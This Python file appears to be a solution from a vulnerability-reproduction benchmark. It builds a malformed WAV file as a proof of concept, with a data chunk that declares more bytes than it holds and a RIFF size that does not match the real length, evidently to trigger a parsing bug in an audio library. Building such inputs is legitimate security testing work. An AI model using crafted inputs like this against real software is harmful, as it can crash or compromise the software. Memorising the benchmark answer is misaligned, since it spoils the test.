class Solution:
    def solve(self, src_path: str) -> bytes:
        riff_size = 46
        size_bytes = riff_size.to_bytes(4, 'little')
        header = b'RIFF' + size_bytes + b'WAVE'
        fmt_id = b'fmt '
        fmt_size = 16
        fmt_size_bytes = fmt_size.to_bytes(4, 'little')
        fmt_data = b'\x01\x00\x01\x00\x44\xac\x00\x00\x10\xb1\x02\x00\x02\x00\x10\x00'
        chunk1 = fmt_id + fmt_size_bytes + fmt_data
        data_id = b'data'
        data_size = 20
        data_size_bytes = data_size.to_bytes(4, 'little')
        chunk2_header = data_id + data_size_bytes
        junk = b'\x00' * 14
        poc = header + chunk1 + chunk2_header + junk
        return poc
